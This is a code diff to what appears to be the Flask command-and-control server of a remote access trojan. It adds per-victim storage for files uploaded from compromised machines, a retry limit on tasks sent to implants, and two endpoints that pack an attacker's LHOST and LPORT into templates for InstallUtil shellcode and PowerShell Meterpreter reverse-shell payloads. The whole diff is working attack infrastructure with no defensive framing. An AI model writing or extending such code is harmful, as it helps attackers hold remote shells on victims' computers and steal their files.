@@ -14,15 +14,16 @@ import os
 import re
 from urllib import unquote
 import base64
+import socket, struct
 reload(sys)
 sys.setdefaultencoding('utf-8')
 
 import payload
 from config import *
-from models import victim, action, upload
+from models import victim, action, upload, settings
 
 
-from flask import Module, request, make_response, render_template_string
+from flask import Module, request, make_response, render_template_string, render_template
 client = Module(__name__)
 
 server = '%s:%d'%(host, port)
@@ -50,9 +51,10 @@ def rat(signature):
 
         #查找未完成任务
         ac = a.gettask(signature)
-        if ac:
+        if ac and ac['repeat']<3:
             exploit = ac['payload']
             pid = ac['pid']
+            a.addrepeat(pid)
         else:
             exploit = p.heartbeat()
             pid = 'heartbeat'
@@ -87,7 +89,9 @@ def upload_controller(signature):
     originalname = request.args.get('filename')
     pid = request.args.get('pid')
     filename = md5(data)
-    with open(upload_dir+os.sep+filename, 'w') as f:
+    if not os.path.exists(upload_dir+os.sep+signature):
+        os.mkdir(upload_dir+os.sep+signature, 0700)
+    with open(upload_dir+os.sep+signature+os.sep+filename, 'w') as f:
         f.write(data)
     u.add(signature, pid, originalname, filename)
     resp = make_response(filename, 200)
@@ -131,3 +135,38 @@ def connect():
     #a = action.action().add(signature, 'init', 'payload', 4) #add init task
     return render_template_string(p.connect(), server=server, signature=signature)
 
+@client.route("/met_sc/<signature>", methods=['GET'])
+def MeterpreterShellcode(signature):
+    c = victim.victim()
+    pattern = r"^[0-9a-f]{32}$"
+    if not re.match(pattern, signature):
+        return "error"
+    if not c.get(signature):
+        return 'error'
+    s = settings.settings()
+    ip = ''
+    for i in socket.inet_aton(socket.gethostbyname(s.get('LHOST'))):
+        ip += hex(ord(i)) + ', '
+
+    port = ''
+    for i in struct.pack('!I', int(s.get('LPORT')))[-2:]:
+        port += hex(ord(i)) + ', '
+    return render_template('InstallUtilShellcodeExec.cs', ip=ip, port=port)
+
+@client.route("/met_ps/<signature>", methods=['GET'])
+def PowershelMeterpreter(signature):
+    c = victim.victim()
+    pattern = r"^[0-9a-f]{32}$"
+    if not re.match(pattern, signature):
+        return "error"
+    if not c.get(signature):
+        return 'error'
+    s = settings.settings()
+    ip = ''
+    for i in socket.inet_aton(socket.gethostbyname(s.get('LHOST'))):
+        ip += hex(ord(i)) + ', '
+
+    port = ''
+    for i in struct.pack('!I', int(s.get('LPORT')))[-2:]:
+        port += hex(ord(i)) + ', '
+    return render_template('PowershellMeterpreterx86.ps1', ip=ip, port=port)
